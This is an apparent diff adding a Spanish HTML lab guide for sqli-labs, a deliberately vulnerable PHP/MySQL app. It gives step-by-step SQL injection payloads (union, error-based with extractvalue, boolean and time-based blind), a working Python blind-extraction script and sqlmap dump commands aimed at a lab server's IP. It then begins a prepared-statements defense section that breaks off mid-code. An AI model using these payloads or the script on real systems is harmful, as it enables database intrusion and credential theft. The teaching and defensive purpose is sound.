@@ -1,0 +1,895 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <title>Guía: SQL Injection — Exfiltración de Bases de Datos con sqli-labs | CRD</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <link rel="stylesheet" href="assets/css/estilos.css">
+</head>
+<body>
+<main>
+  <div data-include="aviso-etico"></div>
+
+  <h1>🗄️ Laboratorio: SQL Injection — Exfiltración de Bases de Datos con sqli-labs (Red &amp; Blue Team)</h1>
+
+  <p>
+    Este laboratorio te guía paso a paso desde cero hasta extraer credenciales completas de una base de datos
+    usando técnicas reales de SQL Injection. El entorno es <strong>sqli-labs</strong>, una aplicación PHP/MySQL
+    deliberadamente vulnerable, diseñada para que puedas experimentar sin riesgos legales.
+  </p>
+  <p>
+    Cada lección de sqli-labs representa un patrón de código inseguro que existe en producción.
+    No son ejercicios abstractos: son los mismos patrones que aparecen en aplicaciones reales mal desarrolladas.
+    Al terminar este laboratorio, sabrás reconocer la vulnerabilidad en código fuente y explotarla sistemáticamente.
+  </p>
+
+  <h2>🗺️ Mapeo de Técnicas MITRE ATT&CK</h2>
+
+  <table border="1" cellpadding="6" style="width: 100%; border-collapse: collapse; margin-bottom: 20px;">
+    <thead>
+      <tr style="background-color: #2e2323;">
+        <th>Táctica</th>
+        <th>Técnica</th>
+        <th>Código MITRE</th>
+      </tr>
+    </thead>
+    <tbody>
+      <tr>
+        <td><strong>Acceso Inicial</strong></td>
+        <td>Exploit Public-Facing Application</td>
+        <td><code>T1190</code></td>
+      </tr>
+      <tr>
+        <td><strong>Recolección</strong></td>
+        <td>Data from Information Repositories</td>
+        <td><code>T1213</code></td>
+      </tr>
+      <tr>
+        <td><strong>Exfiltración</strong></td>
+        <td>Exfiltration Over Web Service</td>
+        <td><code>T1567</code></td>
+      </tr>
+      <tr>
+        <td><strong>Credential Access</strong></td>
+        <td>Credentials from Password Stores</td>
+        <td><code>T1555</code></td>
+      </tr>
+    </tbody>
+  </table>
+
+  <hr>
+
+  <h2>🏗️ Arquitectura del Laboratorio</h2>
+
+  <table border="1" cellpadding="6" style="width: 100%; border-collapse: collapse; margin-bottom: 20px;">
+    <thead>
+      <tr style="background-color: #2e2323;">
+        <th>Componente</th>
+        <th>Detalle</th>
+        <th>Rol</th>
+      </tr>
+    </thead>
+    <tbody>
+      <tr>
+        <td><strong>Servidor sqli-labs</strong></td>
+        <td><code>http://159.112.137.106/sqli-labs/</code></td>
+        <td>Aplicación PHP vulnerable sobre MySQL — objetivo de todos los ataques</td>
+      </tr>
+      <tr>
+        <td><strong>Base de datos</strong></td>
+        <td>MySQL — BD: <code>security</code></td>
+        <td>Contiene la tabla <code>users</code> con credenciales de práctica</td>
+      </tr>
+      <tr>
+        <td><strong>Tu navegador</strong></td>
+        <td>Firefox / Chrome</td>
+        <td>Herramienta principal para las primeras lecciones</td>
+      </tr>
+      <tr>
+        <td><strong>Burp Suite</strong></td>
+        <td>Community Edition</td>
+        <td>Para interceptar y modificar requests HTTP</td>
+      </tr>
+      <tr>
+        <td><strong>Python 3</strong></td>
+        <td>Librería <code>requests</code></td>
+        <td>Automatización del ataque Blind injection</td>
+      </tr>
+    </tbody>
+  </table>
+
+  <div style="background-color: #3d3722; padding: 15px; border-left: 5px solid #07bdff; margin-bottom: 20px;">
+    <strong>💡 Antes de comenzar:</strong> Abre el índice de sqli-labs en
+    <code>http://159.112.137.106/sqli-labs/index.html</code> y verifica que puedes acceder.
+    Luego abre Less-1 en <code>http://159.112.137.106/sqli-labs/Less-1/?id=1</code>
+    y confirma que aparece el mensaje <em>"Your Login name: Dumb / Your Password: Dumb"</em>.
+    Si ves eso, el servidor está listo.
+  </div>
+
+  <hr>
+
+  <h2>📖 Concepto Previo: Por Qué Existe Esta Vulnerabilidad</h2>
+
+  <p>
+    Antes de atacar cualquier lección, necesitas entender la raíz del problema.
+    SQL Injection existe por una sola razón: el código mezcla los datos del usuario
+    con el código SQL en el mismo canal, sin separarlos.
+  </p>
+
+  <p>Cuando un desarrollador escribe esto en PHP:</p>
+
+  <pre><code>$id  = $_GET['id'];                               // toma lo que el usuario escribió
+$sql = "SELECT * FROM users WHERE id='$id'";      // lo pega dentro del SQL
+$result = mysqli_query($con, $sql);               // MySQL ejecuta TODO eso</code></pre>
+
+  <p>
+    MySQL recibe un string completo. No sabe qué parte escribió el desarrollador
+    y qué parte vino del usuario. Para MySQL, todo es SQL.
+    Si el usuario envía algo que modifica la estructura de esa consulta, MySQL lo ejecuta sin preguntar.
+  </p>
+
+  <p>La solución correcta, que verás en la sección de defensa, es esta:</p>
+
+  <pre><code>$stmt = mysqli_prepare($con, "SELECT * FROM users WHERE id = ?");
+mysqli_stmt_bind_param($stmt, "i", $id);   // el valor va por un canal SEPARADO
+mysqli_stmt_execute($stmt);                // MySQL ya compiló la estructura antes</code></pre>
+
+  <p>
+    Con esta versión, MySQL compila la estructura de la consulta primero.
+    Luego recibe el valor del usuario como dato puro, nunca como SQL.
+    Una comilla, un UNION, un OR: todo se trata como texto literal. La inyección es imposible.
+  </p>
+
+  <div style="background-color: #3d3722; padding: 15px; border-left: 5px solid #07bdff; margin-bottom: 20px;">
+    <strong>💡 Regla mental:</strong> Cada lección de sqli-labs usa la primera versión (código inseguro).
+    Tu objetivo es demostrar el impacto. La sección de defensa al final muestra cómo aplicar la segunda versión.
+  </div>
+
+  <hr>
+
+  <h2>🔴 BLOQUE 1 — Inyección Básica y Bypass de Autenticación (Less-1 a Less-4)</h2>
+
+  <p>
+    Estas cuatro lecciones modelan el caso más común de SQLi: un parámetro de URL
+    que se concatena directamente en la consulta. La diferencia entre ellas es cómo
+    el desarrollador delimitó el valor. Identificar ese delimitador es siempre el primer paso.
+  </p>
+
+  <h3>Less-1: String con Comilla Simple</h3>
+
+  <p><strong>Código vulnerable que tiene esta lección:</strong></p>
+  <pre><code>$id  = $_GET['id'];
+$sql = "SELECT * FROM users WHERE id='$id' LIMIT 0,1";</code></pre>
+
+  <p>
+    El valor de <code>id</code> está rodeado de comillas simples en el SQL.
+    Para salir de ese contexto y escribir SQL propio, primero hay que cerrar esa comilla.
+  </p>
+
+  <p><strong>Paso 1 — Confirmar que la página funciona normalmente</strong></p>
+  <pre><code>http://159.112.137.106/sqli-labs/Less-1/?id=1</code></pre>
+  <p>Resultado esperado: <em>"Your Login name: Dumb / Your Password: Dumb"</em>. La página busca al usuario con id=1 y lo muestra. Todo normal por ahora.</p>
+
+  <p><strong>Paso 2 — Romper la consulta para confirmar vulnerabilidad</strong></p>
+  <pre><code>http://159.112.137.106/sqli-labs/Less-1/?id=1'</code></pre>
+  <p>
+    Resultado esperado: error de sintaxis MySQL — <em>"You have an error in your SQL syntax..."</em>.
+    Agregaste una comilla extra. MySQL recibió <code>WHERE id='1''</code> — sintaxis inválida.
+    El error confirma dos cosas: la página es vulnerable y el delimitador es comilla simple.
+  </p>
+
+  <p><strong>Paso 3 — Tomar control de la consulta con un comentario</strong></p>
+  <pre><code>http://159.112.137.106/sqli-labs/Less-1/?id=1'-- -</code></pre>
+  <p>
+    Resultado esperado: vuelve a mostrar "Dumb / Dumb" sin error.
+    El <code>-- -</code> es el símbolo de comentario en MySQL. Todo lo que viene después queda ignorado.
+    MySQL ejecuta <code>WHERE id='1'</code> y el resto desaparece. Tienes control sobre la estructura de la consulta.
+  </p>
+
+  <div style="background-color: #3d3722; padding: 15px; border-left: 5px solid #07bdff; margin-bottom: 20px;">
+    <strong>💡 ¿Por qué <code>-- -</code> y no solo <code>--</code>?</strong>
+    El estándar SQL requiere un espacio después de <code>--</code> para que sea un comentario.
+    Algunos servidores recortan espacios al final de la URL, así que se agrega el guion extra
+    como carácter ancla para asegurar que el espacio no desaparezca.
+  </div>
+
+  <p><strong>Paso 4 — Descubrir cuántas columnas tiene la consulta</strong></p>
+  <p>
+    Para usar UNION más adelante necesitas saber cuántas columnas selecciona la consulta original.
+    La técnica es <code>ORDER BY</code>: si pides ordenar por una columna que no existe, MySQL da error.
+  </p>
+  <pre><code>?id=1' ORDER BY 1-- -   → sin error (columna 1 existe)
+?id=1' ORDER BY 2-- -   → sin error (columna 2 existe)
+?id=1' ORDER BY 3-- -   → sin error (columna 3 existe)
+?id=1' ORDER BY 4-- -   → ERROR: "Unknown column '4' in order clause"</code></pre>
+  <p>Conclusión: la consulta tiene exactamente <strong>3 columnas</strong>.</p>
+
+  <p><strong>Paso 5 — Identificar cuáles columnas son visibles en pantalla</strong></p>
+  <p>
+    Usamos <code>id=999</code> (un ID que no existe) para que la consulta original retorne vacío.
+    Así solo veremos los datos del UNION, no los originales.
+  </p>
+  <pre><code>?id=999' UNION SELECT 1,2,3-- -</code></pre>
+  <p>
+    Resultado esperado: aparecen los números <strong>2</strong> y <strong>3</strong> en pantalla
+    donde antes decía "Login name" y "Password". Esas posiciones son tus canales de exfiltración.
+    Todo lo que pongas ahí aparecerá en la página.
+  </p>
+
+  <p><strong>Paso 6 — Extraer información del sistema</strong></p>
+  <pre><code># Nombre de la base de datos activa
+?id=999' UNION SELECT 1,database(),3-- -
+
+# Versión de MySQL
+?id=999' UNION SELECT 1,version(),3-- -
+
+# Usuario con el que corre la aplicación
+?id=999' UNION SELECT 1,user(),3-- -</code></pre>
+  <p>Resultado esperado: aparece <strong>security</strong> como nombre de BD.</p>
+
+  <p><strong>Paso 7 — Enumerar tablas de la base de datos</strong></p>
+  <p>
+    <code>information_schema</code> es una base de datos especial de MySQL que contiene el mapa
+    de todas las tablas y columnas. No almacena datos de usuarios; almacena metadatos del sistema.
+    Es el directorio del motor de base de datos.
+  </p>
+  <pre><code>?id=999' UNION SELECT 1,GROUP_CONCAT(table_name SEPARATOR ', '),3
+FROM information_schema.tables
+WHERE table_schema=database()-- -</code></pre>
+  <p>Resultado esperado: <em>"emails, referers, uagents, users"</em></p>
+
+  <p><strong>Paso 8 — Enumerar columnas de la tabla users</strong></p>
+  <pre><code>?id=999' UNION SELECT 1,GROUP_CONCAT(column_name SEPARATOR ', '),3
+FROM information_schema.columns
+WHERE table_name='users'-- -</code></pre>
+  <p>Resultado esperado: <em>"id, username, password"</em></p>
+
+  <p><strong>Paso 9 — Extraer todas las credenciales — FLAG para el CTFd</strong></p>
+  <pre><code>?id=999' UNION SELECT 1,GROUP_CONCAT(username,':',password SEPARATOR ' | '),3
+FROM users-- -</code></pre>
+  <p>Resultado esperado: lista completa de usuarios con sus hashes. El hash del usuario <code>admin</code> es tu <strong>FLAG para el CTFd</strong>.</p>
+
+  <hr>
+
+  <h3>Less-2: Integer sin Delimitador</h3>
+
+  <p><strong>Código vulnerable:</strong></p>
+  <pre><code>$sql = "SELECT * FROM users WHERE id=$id LIMIT 0,1";</code></pre>
+
+  <p>
+    No hay comillas alrededor de <code>$id</code>. El valor va directamente como número.
+    No necesitas cerrar ninguna comilla.
+  </p>
+
+  <p><strong>Paso 1 — Confirmar que no hay comilla</strong></p>
+  <pre><code>?id=1'    → error diferente al de Less-1
+?id=1-- - → sin error ✔ confirmado: valor numérico sin delimitador</code></pre>
+
+  <p><strong>Paso 2 — Repetir el flujo completo sin comilla inicial</strong></p>
+  <pre><code># Encontrar columnas
+?id=1 ORDER BY 3-- -   → sin error
+?id=1 ORDER BY 4-- -   → ERROR → 3 columnas
+
+# Extraer credenciales
+?id=999 UNION SELECT 1,GROUP_CONCAT(username,':',password SEPARATOR ' | '),3
+FROM users-- -</code></pre>
+
+  <div style="background-color: #3d3722; padding: 15px; border-left: 5px solid #07bdff; margin-bottom: 20px;">
+    <strong>💡 Punto clave:</strong> El número de columnas y las posiciones visibles son iguales a Less-1
+    porque el código PHP es el mismo, solo cambia el delimitador.
+    La técnica es idéntica; solo adaptas cómo entras al contexto SQL.
+  </div>
+
+  <hr>
+
+  <h3>Less-3: String con Comilla Simple y Paréntesis</h3>
+
+  <p><strong>Código vulnerable:</strong></p>
+  <pre><code>$sql = "SELECT * FROM users WHERE id=('$id') LIMIT 0,1";</code></pre>
+
+  <p>El valor está dentro de comilla simple Y paréntesis: <code>('valor')</code>. Hay que cerrar los dos.</p>
+
+  <p><strong>Paso 1 — Probar el payload de Less-1 y ver que falla</strong></p>
+  <pre><code>?id=1'-- -   → sigue dando error</code></pre>
+  <p>El paréntesis quedó sin cerrar. MySQL recibió <code>WHERE id=('1'-- -)</code> — el paréntesis de cierre rompe la sintaxis.</p>
+
+  <p><strong>Paso 2 — Cerrar comilla Y paréntesis</strong></p>
+  <pre><code>?id=1')-- -   → sin error ✔</code></pre>
+  <p>MySQL recibe: <code>WHERE id=('1')</code> y el resto está comentado.</p>
+
+  <p><strong>Paso 3 — Extraer credenciales</strong></p>
+  <pre><code>?id=999') UNION SELECT 1,GROUP_CONCAT(username,':',password SEPARATOR ' | '),3
+FROM users-- -</code></pre>
+
+  <div style="background-color: #3d3722; padding: 15px; border-left: 5px solid #07bdff; margin-bottom: 20px;">
+    <strong>💡 Método para identificar el delimitador desconocido:</strong>
+    Prueba en orden: <code>1'-- -</code> → <code>1')-- -</code> → <code>1")-- -</code> → <code>1-- -</code>.
+    El primero que no genere error es el delimitador correcto.
+    En producción nunca ves el código fuente; tienes que inferirlo así.
+  </div>
+
+  <hr>
+
+  <h3>Less-4: String con Comilla Doble y Paréntesis</h3>
+
+  <p><strong>Código vulnerable:</strong></p>
+  <pre><code>$sql = "SELECT * FROM users WHERE id=(\"$id\") LIMIT 0,1";</code></pre>
+
+  <p><strong>Paso 1 — Identificar el delimitador</strong></p>
+  <pre><code>?id=1'-- -    → sigue dando error (no es comilla simple)
+?id=1")-- -   → sin error ✔ → delimitador: comilla doble con paréntesis</code></pre>
+
+  <p><strong>Paso 2 — Extraer credenciales</strong></p>
+  <pre><code>?id=999") UNION SELECT 1,GROUP_CONCAT(username,':',password SEPARATOR ' | '),3
+FROM users-- -</code></pre>
+
+  <p>Resumen de los cuatro delimitadores:</p>
+
+  <table border="1" cellpadding="6" style="width: 100%; border-collapse: collapse; margin-bottom: 20px;">
+    <thead>
+      <tr style="background-color: #2e2323;">
+        <th>Lesson</th>
+        <th>Código del desarrollador</th>
+        <th>Delimitador</th>
+        <th>Payload de cierre</th>
+      </tr>
+    </thead>
+    <tbody>
+      <tr><td>Less-1</td><td><code>WHERE id='$id'</code></td><td>comilla simple</td><td><code>'-- -</code></td></tr>
+      <tr><td>Less-2</td><td><code>WHERE id=$id</code></td><td>ninguno (numérico)</td><td><code>-- -</code></td></tr>
+      <tr><td>Less-3</td><td><code>WHERE id=('$id')</code></td><td>comilla simple + paréntesis</td><td><code>')-- -</code></td></tr>
+      <tr><td>Less-4</td><td><code>WHERE id=("$id")</code></td><td>comilla doble + paréntesis</td><td><code>")-- -</code></td></tr>
+    </tbody>
+  </table>
+
+  <hr>
+
+  <h2>🔴 BLOQUE 2 — Error-Based Injection (Less-5 y Less-6)</h2>
+
+  <p>
+    Estas lecciones no muestran datos en la respuesta normal — solo muestran "You are in" o nada.
+    UNION-based no funciona porque no hay posición visual donde aparezcan los datos.
+    Pero la aplicación sí muestra errores de MySQL. Los errores se convierten en el canal de exfiltración.
+  </p>
+
+  <h3>Less-5: Error-Based con extractvalue()</h3>
+
+  <p><strong>Paso 1 — Confirmar que UNION no funciona aquí</strong></p>
+  <pre><code>?id=999' UNION SELECT 1,2,3-- -</code></pre>
+  <p>La página no muestra los números — no hay canal visual para el UNION.</p>
+
+  <p><strong>Paso 2 — Entender cómo funciona extractvalue()</strong></p>
+  <p>
+    <code>extractvalue(xml, xpath)</code> es una función de MySQL para trabajar con XML.
+    Si el XPath es inválido, MySQL genera un error que incluye el resultado de evaluar la expresión.
+    El atacante mete una subconsulta SQL donde va el XPath. MySQL la evalúa, intenta usarla como XPath,
+    falla, y el error expone el resultado de la subconsulta.
+  </p>
+  <pre><code># Internamente ocurre esto:
+# 1. MySQL evalúa: SELECT database() → 'security'
+# 2. concat(0x7e, 'security') → '~security'  (0x7e es el carácter ~)
+# 3. extractvalue(1, '~security') → '~security' no es XPath válido → error
+# 4. El error dice: XPATH syntax error: '~security'
+# 5. El atacante lee 'security' del mensaje de error
+
+?id=1' AND extractvalue(1,concat(0x7e,(SELECT database())))-- -</code></pre>
+  <p>Resultado esperado: <em>XPATH syntax error: '~security'</em></p>
+
+  <p><strong>Paso 3 — Extraer información del sistema</strong></p>
+  <pre><code># Versión de MySQL — FLAG del CTFd
+?id=1' AND extractvalue(1,concat(0x7e,(SELECT version())))-- -
+
+# Usuario de la aplicación
+?id=1' AND extractvalue(1,concat(0x7e,(SELECT user())))-- -</code></pre>
+
+  <p><strong>Paso 4 — Enumerar tablas</strong></p>
+  <pre><code>?id=1' AND extractvalue(1,concat(0x7e,
+  (SELECT GROUP_CONCAT(table_name)
+   FROM information_schema.tables
+   WHERE table_schema=database())))-- -</code></pre>
+  <p>Resultado esperado: <em>XPATH syntax error: '~emails,referers,uagents,users'</em></p>
+
+  <p><strong>Paso 5 — Extraer credenciales</strong></p>
+  <pre><code>?id=1' AND extractvalue(1,concat(0x7e,
+  (SELECT concat(username,0x3a,password)
+   FROM users LIMIT 1)))-- -</code></pre>
+
+  <div style="background-color: #3d3722; padding: 15px; border-left: 5px solid #07bdff; margin-bottom: 20px;">
+    <strong>⚠️ Límite de 32 caracteres:</strong> <code>extractvalue()</code> solo muestra los primeros
+    32 caracteres en el error. Un hash MD5 tiene exactamente 32 caracteres.
+    Si el resultado aparece truncado, usa <code>substring()</code> para paginar:
+    <pre><code>?id=1' AND extractvalue(1,concat(0x7e,
+  substring((SELECT password FROM users WHERE username='admin' LIMIT 1),1,32)))-- -</code></pre>
+  </div>
+
+  <hr>
+
+  <h3>Less-6: Error-Based con Comilla Doble</h3>
+
+  <p><strong>Código vulnerable:</strong></p>
+  <pre><code>$sql = "SELECT * FROM users WHERE id=\"$id\" LIMIT 0,1";</code></pre>
+
+  <p><strong>Paso 1 — Identificar el delimitador</strong></p>
+  <pre><code>?id=1'-- -   → sigue dando error
+?id=1"-- -   → sin error ✔ → delimitador es comilla doble</code></pre>
+
+  <p><strong>Paso 2 — Aplicar extractvalue() con el delimitador correcto</strong></p>
+  <pre><code>?id=1" AND extractvalue(1,concat(0x7e,(SELECT database())))-- -
+?id=1" AND extractvalue(1,concat(0x7e,(SELECT version())))-- -
+?id=1" AND extractvalue(1,concat(0x7e,
+  (SELECT concat(username,0x3a,password) FROM users LIMIT 1)))-- -</code></pre>
+
+  <div style="background-color: #3d3722; padding: 15px; border-left: 5px solid #07bdff; margin-bottom: 20px;">
+    <strong>💡 Punto pedagógico:</strong> La técnica es 100% idéntica a Less-5.
+    Cambió solo el carácter de cierre. Una vez que dominas la mecánica,
+    identificar el delimitador es lo único variable entre lecciones.
+  </div>
+
+  <hr>
+
+  <h2>🔴 BLOQUE 3 — Blind SQL Injection (Less-8, Less-9, Less-10)</h2>
+
+  <p>
+    En producción, la mayoría de aplicaciones no muestran errores ni datos SQL.
+    Solo se ve si la operación tuvo éxito o no. Blind injection demuestra que incluso
+    sin ninguna retroalimentación visual directa, se puede extraer cualquier dato de la base de datos.
+  </p>
+
+  <h3>Less-8: Boolean-Based Blind</h3>
+
+  <p>
+    Esta lección solo muestra "You are in" cuando la consulta retorna resultados.
+    No muestra datos, no muestra errores. Solo esa frase o nada.
+    Esa diferencia binaria es suficiente para extraer cualquier dato.
+  </p>
+
+  <p><strong>Paso 1 — Confirmar la señal binaria</strong></p>
+  <pre><code># Condición TRUE: debe mostrar "You are in"
+?id=1' AND 1=1-- -
+
+# Condición FALSE: NO debe mostrar nada
+?id=1' AND 1=2-- -</code></pre>
+
+  <div style="background-color: #3d1515; padding: 15px; border-left: 5px solid #ff4444; margin-bottom: 20px;">
+    <strong>No avances hasta confirmar esto.</strong> Si ambas URLs muestran lo mismo,
+    la señal booleana no funciona y tendrás que usar time-based (Less-9).
+    La diferencia entre las dos respuestas es el fundamento de todo lo que sigue.
+  </div>
+
+  <p><strong>Paso 2 — Hacer preguntas de sí/no sobre los datos</strong></p>
+  <p>
+    Usamos <code>ASCII(SUBSTRING(dato, posición, 1))</code> para extraer un carácter
+    y comparar su valor numérico. Con búsqueda binaria dividimos el rango a la mitad
+    en cada intento, identificando cualquier carácter en máximo 7 comparaciones.
+  </p>
+  <pre><code># ¿El primer carácter de database() tiene ASCII mayor a 100?
+?id=1' AND ASCII(SUBSTRING(database(),1,1))>100-- -
+→ "You are in" = SÍ (el valor está por encima de 100)
+
+# ¿Mayor a 110?
+?id=1' AND ASCII(SUBSTRING(database(),1,1))>110-- -
+→ "You are in" = SÍ (está entre 110 y 127)
+
+# ¿Mayor a 115?
+?id=1' AND ASCII(SUBSTRING(database(),1,1))>115-- -
+→ Silencio = NO (está entre 110 y 115)
+
+# ¿Es exactamente 115?
+?id=1' AND ASCII(SUBSTRING(database(),1,1))=115-- -
+→ "You are in" = SÍ ✔ → ASCII 115 = carácter 's'</code></pre>
+
+  <p>
+    El primer carácter de <code>database()</code> es <strong>'s'</strong>.
+    Repites esto para la posición 2, 3, 4... hasta reconstruir la palabra completa: <strong>security</strong>.
+  </p>
+
+  <p><strong>Paso 3 — Automatizar con script Python</strong></p>
+  <p>
+    Hacerlo manualmente para un hash MD5 de 32 caracteres requeriría ~224 requests.
+    El siguiente script implementa búsqueda binaria automática para extraer cualquier dato.
+  </p>
+
+  <pre><code>import requests
+
+# ── Configuración ─────────────────────────────────────────────
+TARGET_URL     = "http://159.112.137.106/sqli-labs/Less-8/"
+TRUE_INDICATOR = "You are in"   # texto que aparece cuando la condición es TRUE
+
+def es_verdadero(payload):
+    """Envía el payload y verifica si la respuesta indica TRUE."""
+    url       = f"{TARGET_URL}?id=1{payload}"
+    respuesta = requests.get(url, timeout=5)
+    return TRUE_INDICATOR in respuesta.text
+
+def extraer_string(consulta_sql, longitud_maxima=64):
+    """
+    Extrae el resultado de una consulta SQL carácter por carácter
+    usando búsqueda binaria sobre valores ASCII (32-127).
+    """
+    resultado = ""
+
+    for posicion in range(1, longitud_maxima + 1):
+        limite_inferior = 32    # carácter espacio
+        limite_superior = 127   # carácter DEL
+        caracter_encontrado = False
+
+        while limite_inferior <= limite_superior:
+            punto_medio = (limite_inferior + limite_superior) // 2
+
+            payload = (
+                f"' AND ASCII(SUBSTRING(({consulta_sql}),{posicion},1))"
+                f">{punto_medio}-- -"
+            )
+
+            if es_verdadero(payload):
+                limite_inferior = punto_medio + 1
+            else:
+                payload_exacto = (
+                    f"' AND ASCII(SUBSTRING(({consulta_sql}),{posicion},1))"
+                    f"={punto_medio}-- -"
+                )
+                if es_verdadero(payload_exacto):
+                    resultado += chr(punto_medio)
+                    caracter_encontrado = True
+                    break
+                else:
+                    limite_superior = punto_medio - 1
+
+        if not caracter_encontrado:
+            break
+
+    return resultado
+
+
+# ── Ejecución ─────────────────────────────────────────────────
+print("[*] Extrayendo nombre de la base de datos...")
+db = extraer_string("SELECT database()")
+print(f"[+] Base de datos: {db}")
+
+print("\n[*] Extrayendo tablas...")
+tablas = extraer_string(
+    f"SELECT GROUP_CONCAT(table_name ORDER BY table_name SEPARATOR ',')"
+    f" FROM information_schema.tables WHERE table_schema='{db}'"
+)
+print(f"[+] Tablas: {tablas}")
+
+print("\n[*] Extrayendo columnas de 'users'...")
+columnas = extraer_string(
+    f"SELECT GROUP_CONCAT(column_name SEPARATOR ',')"
+    f" FROM information_schema.columns WHERE table_name='users'"
+)
+print(f"[+] Columnas: {columnas}")
+
+print("\n[*] Extrayendo hash del administrador...")
+hash_admin = extraer_string(
+    "SELECT password FROM users WHERE username='admin' LIMIT 1"
+)
+print(f"[+] Hash admin: {hash_admin}")</code></pre>
+
+  <p><strong>Cómo ejecutar el script:</strong></p>
+  <pre><code># Instalar la librería si no la tienes
+pip3 install requests
+
+# Guardar el código como extractor.py y ejecutar
+python3 extractor.py</code></pre>
+
+  <p>Salida esperada:</p>
+  <pre><code>[+] Base de datos: security
+[+] Tablas: emails,referers,uagents,users
+[+] Columnas: id,username,password
+[+] Hash admin: 5f4dcc3b5aa765d61d8327deb882cf99</code></pre>
+
+  <p>
+    El hash <code>5f4dcc3b5aa765d61d8327deb882cf99</code> es tu <strong>FLAG para el CTFd</strong>.
+    Como actividad adicional, crackéalo en <a href="https://crackstation.net" target="_blank">crackstation.net</a>
+    y anota cuánto tardó. Eso ilustra por qué MD5 sin salt no es aceptable para almacenar contraseñas.
+  </p>
+
+  <hr>
+
+  <h3>Less-9: Time-Based Blind</h3>
+
+  <p>
+    Esta lección siempre muestra "You are in" independientemente de si la condición es verdadera o falsa.
+    No hay señal visual. El único canal disponible es el tiempo de respuesta.
+  </p>
+
+  <p><strong>Paso 1 — Confirmar que la señal booleana NO funciona</strong></p>
+  <pre><code>?id=1' AND 1=1-- -   → "You are in"
+?id=1' AND 1=2-- -   → "You are in" también</code></pre>
+  <p>Ambas respuestas son idénticas. Boolean-based no funciona aquí.</p>
+
+  <p><strong>Paso 2 — Confirmar que time-based funciona</strong></p>
+  <p>
+    <code>SLEEP(N)</code> hace que MySQL espere N segundos antes de retornar.
+    Si la respuesta tarda ~3 segundos, la inyección funciona y el tiempo es el canal.
+  </p>
+  <pre><code>?id=1' AND SLEEP(3)-- -</code></pre>
+  <p>Resultado esperado: la respuesta tarda aproximadamente 3 segundos.</p>
+
+  <p><strong>Paso 3 — Hacer preguntas con tiempo como canal</strong></p>
+  <pre><code># Si TRUE → espera 3 segundos. Si FALSE → responde inmediatamente.
+?id=1' AND IF(ASCII(SUBSTRING(database(),1,1))>100,SLEEP(3),0)-- -</code></pre>
+  <p>La lógica de extracción es idéntica a Less-8. Solo cambia el canal: tiempo en lugar de texto visible.</p>
+
+  <div style="background-color: #3d3722; padding: 15px; border-left: 5px solid #07bdff; margin-bottom: 20px;">
+    <strong>💡 Por qué time-based es menos confiable:</strong>
+    La latencia de red puede generar falsos positivos. En red local (como este laboratorio)
+    la latencia es despreciable y el método es confiable. En entornos reales con alta latencia
+    se usan sleeps de 5+ segundos y múltiples confirmaciones por bit.
+  </div>
+
+  <hr>
+
+  <h3>Less-10: Time-Based con Comilla Doble</h3>
+
+  <p>Mismo mecanismo que Less-9. Solo cambia el delimitador.</p>
+  <pre><code># Confirmar delimitador
+?id=1"-- -   → sin error ✔
+
+# Confirmar time-based
+?id=1" AND SLEEP(3)-- -
+
+# Extracción
+?id=1" AND IF(ASCII(SUBSTRING(database(),1,1))>100,SLEEP(3),0)-- -</code></pre>
+
+  <hr>
+
+  <h2>🔧 BLOQUE 4 — SQLMap como Validación</h2>
+
+  <p>
+    Una vez que completaste los retos manualmente, SQLMap sirve para validar que entendiste
+    correctamente y para ver en tiempo real los mismos payloads que construiste a mano.
+    No uses SQLMap antes de completar los pasos manuales: perderías el aprendizaje.
+  </p>
+
+  <p><strong>Validar Less-1 (Union-based):</strong></p>
+  <pre><code>sqlmap -u "http://159.112.137.106/sqli-labs/Less-1/?id=1" \
+  --dbs \
+  --batch</code></pre>
+
+  <p><strong>Validar Less-8 (Boolean Blind) — ver los payloads en tiempo real:</strong></p>
+  <pre><code># -v 3 muestra cada payload que prueba SQLMap
+# --technique=B limita a Boolean-based (lo que hiciste manualmente)
+sqlmap -u "http://159.112.137.106/sqli-labs/Less-8/?id=1" \
+  -D security \
+  -T users \
+  --dump \
+  --technique=B \
+  --batch \
+  -v 3</code></pre>
+
+  <div style="background-color: #3d3722; padding: 15px; border-left: 5px solid #07bdff; margin-bottom: 20px;">
+    <strong>💡 Qué observar en el verbose output:</strong> Con <code>-v 3</code> verás cada payload
+    que SQLMap envía. Reconocerás los mismos patrones que construiste manualmente:
+    <code>AND ASCII(SUBSTRING(...))</code>, búsqueda binaria, etc.
+    Eso cierra el ciclo entre comprensión manual y automatización.
+  </div>
+
+  <hr>
+
+  <h2>🔵 Blue Team: Defensa Contra SQL Injection</h2>
+
+  <h3>Capa 1 — Prevención: Prepared Statements</h3>
+
+<p>
+  La raíz del problema es que el código mezcla dos cosas en el mismo canal:
+  la estructura de la consulta SQL y el valor que proviene del usuario.
+  MySQL no puede distinguir una de la otra, así que ejecuta todo como si fuera
+  código legítimo. Los Prepared Statements resuelven esto separando esos dos canales.
+</p>
+
+<p>
+  <strong>Canal 1 — La estructura va primero:</strong>
+  La aplicación envía la consulta con un signo de pregunta como marcador de posición,
+  sin ningún valor todavía. MySQL recibe esa estructura, la parsea, la valida y
+  la compila a bytecode. En este punto la consulta ya está fija y no puede ser
+  modificada por nada que llegue después.
+</p>
+
+<p>
+  <strong>Canal 2 — El valor llega por separado y nunca pasa por el parser:</strong>
+  MySQL inserta el valor directamente en el bytecode ya compilado.
+  Si el usuario envía un payload de inyección, MySQL lo trata como texto literal,
+  no como SQL. No hay comillas que cerrar, no hay instrucciones que inyectar.
+</p>
+
+<p>Así se ve en código, línea por línea:</p>
+
+<pre><code># CÓDIGO INSEGURO — estructura y datos en el mismo canal
+$id  = $_GET['id'];
+$sql = "SELECT * FROM users WHERE id='$id'";
+#                                    ^^^^
+# Si el usuario envía:  1' OR '1'='1
+# MySQL recibe:         WHERE id='1' OR '1'='1'
+# Resultado:            retorna TODOS los usuarios — bypass total
+$r = mysqli_query($con, $sql);</code></pre>
+
+<pre><code># CÓDIGO SEGURO — dos canales completamente separados
+$id = $_GET['id'];
+
+# Canal 1: solo la estructura de la consulta
+# El signo ? es el marcador de posición — no hay valor aquí todavía
+# MySQL compila esta estructura a bytecode. Ya no puede ser modificada.
+$stmt = mysqli_prepare($con, "SELECT * FROM users WHERE id = ?");
+
+# Canal 2: el valor del usuario, declarando su tipo
+# "i" = integer — si el usuario envía texto malicioso, MySQL lo trata como número
+# El parser nunca ve este valor. La inyección es imposible.
+mysqli_stmt_bind_param($stmt, "i", $id);
+
